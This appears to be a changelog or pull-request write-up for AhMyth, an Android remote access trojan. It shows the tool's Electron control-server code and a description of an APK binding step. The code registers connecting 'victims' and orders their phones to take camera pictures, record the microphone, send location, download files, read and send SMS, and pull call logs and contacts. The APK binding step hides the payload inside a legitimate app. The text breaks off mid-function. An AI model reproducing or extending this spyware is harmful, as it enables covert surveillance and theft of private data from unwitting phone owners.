<details>
    <summary>Updated HTML Scripts</summary>
    <br>

- index.html
```html
    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/AppCtrl.js"></script>
```
- lab.html
```html
    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/fomantic-ui/dist/semantic.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="../node_modules/angular-route/angular-route.min.js"></script>
    <script type='text/javascript' src='assets/js/lib/ng-infinite-scroll.min.js'></script>
    <script type="text/javascript" src="assets/js/lib/leaflet.js"></script>
    <script type="text/javascript" src="assets/js/controllers/LabCtrl.js"></script>
```
  
- notification.html
```html
    <script type="text/javascript" src="assets/js/lib/jquery-3.7.1.min.js"></script>
    <script type="text/javascript" src="../node_modules/angular/angular.js"></script>
    <script type="text/javascript" src="assets/js/controllers/NotifiCtrl.js"></script>
```
</details>
<br>

<details>
    <summary>Updated Package.json Files</summary>
    <br>

- `AhMyth-Server/App` Directory package.json
```json
{
    "name": "AhMyth",
    "description": "Android Remote Administration Tool",
    "author": "AhMyth <AhMyth@protonmail.com>",
    "productName": "AhMyth",
    "version": "1.0-beta.6",
    "homepage": "https://github.com/AhMyth/AhMyth-Android-RAT",
    "main": "main.js",
    "dependencies": {
        "@electron/remote": "^2.1.2",
        "angular": "^1.8.3",
        "angular-route": "^1.8.3",
        "fomantic-ui": "^2.8.8",
        "fs-extra": "^11.1.0",
        "geoip-lite": "^1.4.6",
        "readdirp": "^3.6.0",
        "socket.io": "^2.5.0",
        "xml2js": "^0.6.0"
    }
}
```

- `AhMyth-Server` directory package.json
```json
{
    "main": "./app/main.js",
    "devDependencies": {
      "electron": "^29.2.0",
      "electron-builder": "^22.11.7",
      "electron-packager": "^15.4.0"
    },
    "license": "GNU GPLv3",
    "build": {
      "appId": "Ahmyth.android.rat",
      "win": {
        "publisherName": "AhMyth",
        "icon": "build/icon.ico"
      },
      "asarUnpack": "**/app/Factory/**/*"
    },
    "scripts": {
      "start": "npx electron ./app",
      "clean": "rm -rf ./dist",
      "prepack": "rm -rf ./node_modules && rm -rf ./app/node_modules",
      "build": "npm run prepack && npm run build:linux && npm run build:win",
      "build:linux": "npm run prepack && npm run build:linux32 && npm run build:linux64",
      "build:linux32": "npm run prepack && npx electron-builder --linux deb --ia32",
      "build:linux64": "npm run prepack && npx electron-builder --linux deb --x64",
      "build:win": "npm run prepack && npm run build:win32 && npm run build:win64",
      "build:win32": "npm run prepack && npx electron-builder --win --ia32",
      "build:win64": "npm run prepack && npx electron-builder --win --x64"
    }
  }  
```
</details>
<br>

<details>
    <summary>Updated Main & Render Processes for Electron 29.2.0 Migration + 32bit Arch check and message</summary>
    <br>

<details>
    <summary>Main GUI (Working)</summary>
    <br>

- main.js
```js
const { app, BrowserWindow, dialog, screen } = require('electron');
const { ipcMain } = require('electron');
const { initialize, enable } = require('@electron/remote/main');
const victimsList = require('./app/assets/js/model/Victim');
var io = require('socket.io');
var geoip = require('geoip-lite');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
const IOs = {};
//--------------------------------------------------------------

initialize();

function createWindow() {

    // get Display Sizes ( x , y , width , height)
    display = screen.getPrimaryDisplay();

  //------------------------SPLASH SCREEN INIT------------------------------------
  // create the splash window
  let splashWin = new BrowserWindow({
    width: 700,
    height: 500,
    frame: false,
    transparent: true,
    icon: __dirname + '/app/assets/img/icon.png',
    type: "splash",
    alwaysOnTop: true,
    show: false,
    position: "center",
    resizable: false,
    toolbar: false,
    fullscreen: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false
    }
  });

  // load splash file
  splashWin.loadFile(__dirname + '/app/splash.html');

  splashWin.webContents.on('did-finish-load', function () {
    splashWin.show(); // Show splash screen

    // 32bit Arch Check and deprecation message
    setTimeout(() => {
      const architecture = process.arch;
      if (architecture === 'ia32') {
        // If not 64-bit architecture, show message box
        dialog.showMessageBoxSync(splashWin, {
          type: 'info',
          title: 'Architecture Check',
          message: 'AhMyth will soon be dropping support for Operating Systems running 32bit Architecture, sorry for any inconvenience.',
          buttons: ['OK']
        });
      }
    }, 500); // Adjust the delay as needed
  });

  // Emitted when the window is closed.
  splashWin.on('closed', () => {
    // Dereference the window object
    splashWin = null
  })

  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 900,
    height: 690,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      //preload: __dirname + '\\preload'
    }
  });

  win.loadFile(__dirname + '/app/index.html');

  enable(win.webContents);

  win.webContents.openDevTools();

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  });

  // Emitted when the window is finished loading.
  win.webContents.on('did-finish-load', function () {
    setTimeout(() => {
      splashWin.close(); // Close splash screen
      win.show(); // Show main UI
    }, 2000);
  });
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow);

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
});

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
});

//handle the Uncaught Exceptions

const listeningStatus = {}; // Object to track listening status for each port

ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;
    var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
    var country = null;
    var geo = geoip.lookup(ip); // check ip location
    if (geo)
      country = geo.country.toLowerCase();

    // Add the victim to victimList
    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);

    //------------------------Notification SCREEN INIT------------------------------------
    // create the Notification window
    let notification = new BrowserWindow({
      frame: false,
      x: display.bounds.width - 280,
      y: display.bounds.height - 78,
      show: false,
      width: 280,
      height: 78,
      resizable: false,
      toolbar: false,
      webPreferences: {
        nodeIntegration: true,
        enableRemoteModule: true,
        contextIsolation: false,
        //preload: __dirname + '\\preload'
      }
    });

    // Emitted when the window is finished loading.
    notification.webContents.on('did-finish-load', function () {
      notification.show();
      setTimeout(function () {
        notification.destroy()
      }, 3000);
    });

    notification.webContents.victim = victimsList.getVictim(index);
    notification.loadFile(__dirname + '/app/notification.html');

    enable(notification.webContents);

    //notify renderer proccess (AppCtrl) about the new Victim
    win.webContents.send('SocketIO:NewVictim', index);

    socket.on('disconnect', function () {
      // Decrease the socket count on a disconnect
      victimsList.rmVictim(index);

      //notify renderer proccess (AppCtrl) about the disconnected Victim
      win.webContents.send('SocketIO:RemoveVictim', index);

      if (windows[index]) {
        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
        //delete the window from windowsList
        delete windows[index]
      }

      //notify renderer proccess (LabCtrl) if opened about the Server Disconnecting
      if (windows[index]) {
        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
        // delete the window from the winowsList
        delete windows[index]
      }
    });
  });

  event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port);
  listeningStatus[port] = true; // Update listening status for the specific port
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    IOs[port].close();
    IOs[port] = null;
    event.reply('SocketIO:Stop', '[✓] Stopped listening on Port: ' + port);
    listeningStatus[port] = false; // Update listening status for the specific port
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});

process.on('uncaughtException', function (error) {
  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:ListenError', "Address Already in Use");
  } else {
    dialog.showErrorBox("ERROR", JSON.stringify(error));
    console.log(error);
  }
});

// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 700,
    height: 750,
    show: false,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true,
      enableRemoteModule: true,
      contextIsolation: false,
      //preload: __dirname + '\\preload'
    }
  })

  //add this window to windowsList
  windows[index] = child.id;

  enable(child.webContents);
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadFile(__dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {
      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
    }
  })
});
```
<br>

- AppCtrl.js
```js
const { ipcRenderer } = require('electron');
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
var fs = require('fs-extra');
var xml2js = require('xml2js');
var readdirp = require('readdirp');
const { dialog, getCurrentWindow } = require('@electron/remote');
const { getVictim } = require('@electron/remote').require('./main');
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const os = require('os');
const dir = require("path");

//--------------------------------------------------------------
var viclist = {};
var dataPath = dir.join(os.homedir(), CONSTANTS.dataDir);
var downloadsPath = dir.join(dataPath, CONSTANTS.downloadPath);
var outputPath = dir.join(dataPath, CONSTANTS.outputApkPath);
var logPath = dir.join(dataPath, CONSTANTS.outputLogsPath);
//--------------------------------------------------------------



// App Controller for (index.html)
app.controller("AppCtrl", ($scope) => {
    $appCtrl = $scope;
    $appCtrl.victims = viclist;
    $appCtrl.isVictimSelected = true;
    $appCtrl.bindApk = {
        enable: false, method: 'BOOT'
    }; //default values for binding apk

    var log = document.getElementById("log");

    $appCtrl.logs = [];

    $('.menu .item')
        .tab();
    $('.ui.dropdown')
        .dropdown();

    const window = getCurrentWindow();
    $appCtrl.close = () => {
        window.close();
    };

    $appCtrl.minimize = () => {
        window.minimize();
    };

    $appCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Listen", port);
    };

    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }

        ipcRenderer.send("SocketIO:Stop", port);
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = true;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        viclist[index] = getVictim(index);
        $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
        delete viclist[index];
        $appCtrl.$apply();
    });

    $appCtrl.openLab = (index) => {
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };
```
</details>
<br>
<details>
    <summary>Lab and Notification Render Process (Working)</summary>
    <br>

- Lab Render Process (LabCtrl.js)
```js
const { ipcRenderer } = require('electron');
const { dialog, getCurrentWindow } = require('@electron/remote');
const app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
const fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants');
const ORDER = CONSTANTS.order;
const os = require('os');
const path = require("path");

const dataPath = path.join(os.homedir(), CONSTANTS.dataDir);
const downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
const outputPath = path.join(dataPath, CONSTANTS.outputApkPath);

let socket = require('@electron/remote').getCurrentWebContents().victim;

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        });
});

//-----------------------LAB Controller (lab.html)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
    });

    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
    });

    // to move from view to another
    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }

});

//-----------------------Camera Controller (camera.html)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    var camera = CONSTANTS.orders.camera;

    // remove socket listner if the camera page is changed or destroied
    $camCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(camera);
    });

    $rootScope.Log('Get cameras list');
    $camCtrl.load = 'loading';
    // send order to victim to bring camera list
    socket.emit(ORDER, { order: camera, extra: 'camList' });

    // wait any response from victim
    socket.on(camera, (data) => {
        if (data.camList == true) { // the rseponse is camera list
            $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[1];
            $camCtrl.$apply();
        } else if (data.image == true) { // the rseponse is picture

            $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);

            // convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();

            $camCtrl.savePhoto = () => {
                $rootScope.Log('Saving picture..');
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);

                });

            }

        }
    });

    $camCtrl.snap = () => {
        // send snap request to victim
        $rootScope.Log('Snap a picture');
        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
    }

});

//-----------------------File Controller (fileManager.html)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    var fileManager = CONSTANTS.orders.fileManager;


    // remove socket listner
    $fmCtrl.$on('$destroy', () => {
        // release resources
        socket.removeAllListeners(fileManager);
    });

    // limit the ng-repeat
    // infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    }

    // send request to victim to bring files
    $rootScope.Log('Get files list');
    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });

    socket.on(fileManager, (data) => {
        if (data.file == true) { // response with file's binary
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);

            // function to save the file to my local disk
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });

        } else if (data.length != 0) { // response with files list
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }

    });


    // when foder is clicked
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
        }
    };

    // when save button is clicked
    // send request to bring file's' binary
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
    }

});

//-----------------------SMS Controller (sms.html)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log('Sending SMS..');
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    //listening for victim response
    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            $SMSCtrl.$apply();
        } else {
            if (data == true)
                $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
        }
    });

});

//-----------------------Calls Controller (callslogs.html)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('Get Calls list..');
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("Saving Calls List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });

});

//-----------------------Contacts Controller (contacts.html)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('Get Contacts list..');
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("Saving Contacts List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });

});

//-----------------------Mic Controller (mic.html)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log('Recording ' + seconds + "'s...");
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('Seconds must be more than 0');

        }

    }

    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('Saving file..');
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });

            };

        }

    });
});

//-----------------------Location Controller (location.html)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
    });

    var map = L.map('mapid').setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    $LocCtrl.Refresh = () => {

        $LocCtrl.load = 'loading';
        $rootScope.Log('Get Location..');
        socket.emit(ORDER, { order: location });

    }

    $LocCtrl.load = 'loading';
    $rootScope.Log('Get Location..');
    socket.emit(ORDER, { order: location });

    var marker;
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('Try to Refresh', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);
                if (!marker)
                    var marker = L.marker(victimLoc).addTo(map);
                else
                    marker.setLatLng(victimLoc).update();

                map.panTo(victimLoc);
            }
        } else
            $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
    });

});
```
<br>

- Notification Render Process (NotifiCtrl.js)
```js
const { ipcRenderer } = require('electron');
const { getCurrentWebContents } = require('@electron/remote');
const app = angular.module('myappy', []);

const victim = getCurrentWebContents().victim;

app.controller("NotifiCtrl", function($scope, $location) {
    $NotifiCtrl = $scope;
    $NotifiCtrl.victimSocket = victim.ip + ":" + victim.port;
    $NotifiCtrl.victimModel = victim.model;
    $NotifiCtrl.victimCountry = victim.country;
});
```
</details>

</details>
<br>

<details>
    <summary>New CONSTANTS entry + Updated "APK Browser" & "GenerateApk" functions</summary>
    <br>

1. Fixes wrongly printed error messages for failed manifest reading and parsing
2. Adds cleanup function when binding is finished.
3. Sets the name of the APK the user is binding to as the name of the Output Bound Payload
4. sets os Specific path seperation for cleaner code
<br>


- Constants
```js
//---------------------App Controller Functs--------------------------------
exports.getApkNameBoundSigned = function(apkFolder) {
    return path.basename(apkFolder) + "-aligned-debugSigned.apk";
};
```

- Browser Dialog
```js
    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[x] No APK Was Selected as a Template', CONSTANTS.logStatus.FAIL); //if user cancels the dialog
            } else {
                var printApkPath = result.filePaths[0];
                var printApkName = dir.basename(printApkPath);
                $appCtrl.Log('[¡] "' + printApkName + '"' + ' Was Chosen as a Template', CONSTANTS.logStatus.INFO); //when the user selects an apk
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[x] No APK Was Selected as a Template'); //if user cancels the dialog
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
